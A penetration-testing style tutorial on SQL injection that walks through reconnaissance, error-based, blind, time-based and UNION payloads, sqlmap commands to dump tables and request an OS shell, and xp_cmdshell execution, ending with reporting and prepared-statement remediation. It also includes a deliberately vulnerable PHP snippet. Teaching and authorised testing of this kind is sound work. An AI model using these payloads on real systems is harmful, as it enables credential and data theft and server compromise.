**SQL Injection Exploitation Guide**

**Phase 1: Reconnaissance and Identification**

*   **Goal:** Identify potential SQL injection points in the target application.
*   **Tools:** Web browser (Chrome, Firefox), Burp Suite (or similar proxy), `curl`, `nmap`

1.  **Map the Application:**
    *   Explore the target website. Identify all URLs, forms, and functionalities.  Look for areas where user input is used in database queries. Common entry points include:
        *   Login forms
        *   Search boxes
        *   Contact forms
        *   URL parameters (e.g., `example.com/product.php?id=123`)
        *   Any other area where user-supplied data interacts with the backend.

2.  **Identify Potential Injection Points:**
    *   Focus on parameters that seem likely to be used in database queries.
    *   Look for dynamic web pages that take parameters in the URL.
    *   Check for parameters passed via POST requests in forms.

3.  **Passive Analysis (Optional):**
    *   Examine website source code (view page source) for clues about database interaction. (e.g. database name, etc.).
    *   Check `robots.txt` and other publically available files for database configuration files or API endpoints.

**Phase 2: Testing and Confirmation**

*   **Goal:** Confirm the presence of a SQL injection vulnerability at identified entry points.
*   **Tools:** Web browser, Burp Suite (or similar proxy), `sqlmap` (recommended for automation), `curl`.

1.  **Basic Error-Based Injection:**
    *   **Purpose:**  Trigger SQL errors to confirm injection.
    *   **Method:**  Append special characters to input fields and observe the server's response. Common payloads include:
        *   `'` (single quote)
        *   `"` (double quote)
        *   `\` (backslash)
        *   `--` (SQL comment)
        *   `/*` and `*/` (SQL comment)
    *   **Example:**
        *   Target URL: `example.com/product.php?id=123`
        *   Modified URL: `example.com/product.php?id=123'`
        *   If the server returns a SQL error (e.g., "syntax error near ..."), it's a strong indicator of SQL injection.

2.  **Boolean-Based Blind SQL Injection:**
    *   **Purpose:**  Infer information based on the truthiness of SQL statements.  No direct error message is returned.
    *   **Method:**  Inject SQL code that makes the query either true or false and observe the different response from the server.
    *   **Example:**
        *   Target URL: `example.com/product.php?id=123`
        *   Try: `example.com/product.php?id=123 AND 1=1` (This should ideally return the same page as `id=123`.)
        *   Try: `example.com/product.php?id=123 AND 1=2` (This should ideally return an error or a different/empty page.)
        *   If `1=1` shows normal data and `1=2` doesn't, you likely have a blind SQL injection.

3.  **Time-Based Blind SQL Injection:**
    *   **Purpose:**  Infer information by observing the time it takes for the server to respond.
    *   **Method:**  Inject SQL code that uses functions like `SLEEP()` (MySQL), `WAITFOR DELAY` (SQL Server), or `pg_sleep()` (PostgreSQL) to introduce a delay in the query execution.
    *   **Example (MySQL):**
        *   Target URL: `example.com/product.php?id=123`
        *   Try: `example.com/product.php?id=123 AND SLEEP(5)`  (This should make the server take 5 seconds to respond if the injection works.)
    *   If the server takes significantly longer (around 5 seconds in this example) to respond, it indicates time-based SQL injection.

4.  **UNION-Based SQL Injection:**
    *   **Purpose:**  Retrieve data from other tables in the database. Requires knowing the number of columns and data types in the original query (this can be brute-forced).
    *   **Method:**  Use the `UNION SELECT` statement to combine the results of your injected query with the original query.
    *   **Example (MySQL):**
        *   Target URL: `example.com/product.php?id=123`
        *   1.  **Determine number of columns:** `example.com/product.php?id=123 ORDER BY 1` Try incrementing the number until an error is thrown. This indicates the number of columns.
        *   2. **Craft UNION query:** Let's say the vulnerable query retrieves 2 columns.
        `example.com/product.php?id=-1 UNION SELECT 1,version()`
            * `-1` : Ensures that no result of the original query is returned.
            * `UNION SELECT` : combines result sets of the two queries.
            * `1, version()`: 1 is the dummy integer value, and `version()` retrieves the database version. If it works, the version should be displayed on the page.  Adjust data types as needed (e.g., `NULL` for unknown types, strings for text fields).

5.  **Automated Exploitation with `sqlmap`:**
    *   `sqlmap` is a powerful tool that automates the process of finding and exploiting SQL injection vulnerabilities.
    *   **Basic Usage:**
        ```bash
        sqlmap -u "example.com/product.php?id=123" --dbs  # Enumerate databases
        sqlmap -u "example.com/product.php?id=123" -D "databasename" --tables # Enumerate tables in a database
        sqlmap -u "example.com/product.php?id=123" -D "databasename" -T "tablename" --columns # Enumerate columns in a table
        sqlmap -u "example.com/product.php?id=123" -D "databasename" -T "tablename" --dump # Dump the contents of a table
        sqlmap -u "example.com/product.php?id=123" --os-shell # Get an operating system shell (if possible)
        ```
    *   `sqlmap` will automatically try different injection techniques and attempt to extract information from the database.  It handles the complexities of different database systems and injection types.

**Phase 3: Exploitation and Data Exfiltration**

*   **Goal:**  Retrieve sensitive data or gain control of the system.
*   **Tools:** `sqlmap`, command-line tools, scripting languages (Python, etc.)

1.  **Data Exfiltration:**
    *   **Using UNION-based injection:** (If applicable)
        *   Retrieve usernames, passwords, email addresses, credit card numbers, and other sensitive data.
        *   `example.com/product.php?id=-1 UNION SELECT 1,username,password FROM users`
    *   **Using `sqlmap`:**
        *   `sqlmap -u "example.com/product.php?id=123" -D "databasename" -T "users" --dump`
2.  **Privilege Escalation (Advanced):**
    *   If the database user has sufficient permissions, you might be able to:
        *   Create new users with administrative privileges.
        *   Modify existing user accounts.
        *   Execute operating system commands (e.g., using `xp_cmdshell` in SQL Server or `sys_exec` in Oracle, but requires enabling of these features).  This is highly dependent on the database configuration.
3.  **Operating System Access (Advanced):**
    *   In rare cases, it may be possible to gain direct access to the server's operating system through SQL injection. This often requires specific database configurations and the presence of dangerous stored procedures.
    *   **Example (SQL Server with `xp_cmdshell` enabled):**
        ```sql
        ;EXEC xp_cmdshell 'whoami'
        ```

**Phase 4: Reporting and Remediation Recommendations**

*   **Goal:** Document the vulnerability and recommend steps to fix it.

1.  **Detailed Report:**
    *   **Executive Summary:**  Brief overview of the vulnerability and its potential impact.
    *   **Technical Description:**  Detailed explanation of the vulnerability, including the affected URL parameters, the type of SQL injection, and the payloads used to exploit it.
    *   **Proof of Concept:**  Step-by-step instructions on how to reproduce the vulnerability. Include screenshots and command-line output.
    *   **Impact Assessment:**  Explain the potential consequences of the vulnerability, such as data breach, unauthorized access, and system compromise.
    *   **Remediation Recommendations:**  Provide specific recommendations on how to fix the vulnerability.

2.  **Remediation Recommendations:**
    *   **Input Validation:**  Thoroughly validate all user input on the server-side.  Reject or sanitize any input that doesn't conform to expected formats.
    *   **Parameterized Queries (Prepared Statements):**  Use parameterized queries (or prepared statements) to separate data from SQL code. This is the most effective way to prevent SQL injection.
    *   **Principle of Least Privilege:**  Grant database users only the minimum privileges necessary to perform their tasks.  Avoid using the `sa` (SQL Server) or `root` (MySQL) accounts in application code.
    *   **Web Application Firewall (WAF):**  Deploy a WAF to detect and block malicious requests, including SQL injection attempts.
    *   **Regular Security Audits:**  Conduct regular security audits and penetration tests to identify and address vulnerabilities.
    *   **Update Software:** Keep the database server, web server, and all other software components up-to-date with the latest security patches.
    *   **Disable Unnecessary Stored Procedures:**  Disable or remove stored procedures that are not needed, especially those that allow operating system command execution (e.g., `xp_cmdshell` in SQL Server).

**Practical Examples**

Let's say we have a vulnerable PHP script:

```php
<?php
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = " . $id;
$result = mysql_query($query); // Legacy mysql_query - BAD!
// ... (rest of the code to display the results)
?>
```

Here's how you could exploit it:

1.  **Error-based:** `example.com/product.php?id=1'`  (This will likely generate a SQL error.)

2.  **UNION-based:**
    *   `example.com/product.php?id=-1 UNION SELECT 1,version()` (To get the database version.)
    *   `example.com/product.php?id=-1 UNION SELECT 1,database()` (To get the database name.)

3. **Example using prepared statements (to remediate the vulnerability):**

```php
<?php
$id = $_GET['id'];

// Use PDO (or mysqli) for prepared statements
try {
    $pdo = new PDO('mysql:host=localhost;dbname=your_database', 'your_user', 'your_password');
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $stmt = $pdo->prepare("SELECT * FROM products WHERE id = :id");
    $stmt->bindParam(':id', $id, PDO::PARAM_INT); // Treat $id as an integer

    $stmt->execute();

    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        // Process and display the results
        echo "Product Name: " . htmlspecialchars($row['name']) . "<br>"; //Important, use htmlspecialchars to avoid XSS
    }

} catch (PDOException $e) {
    echo "Error: " . $e->getMessage();
}
?>
```

**Summary**

SQL injection is a critical vulnerability that can allow attackers to bypass authentication, steal sensitive data, modify data, and even gain control of the server. By systematically identifying potential entry points, testing for injection vulnerabilities, and exploiting them, you can demonstrate the severity of the issue and provide actionable recommendations to fix it.  Remember to prioritize remediation efforts and implement robust security measures to prevent future attacks.
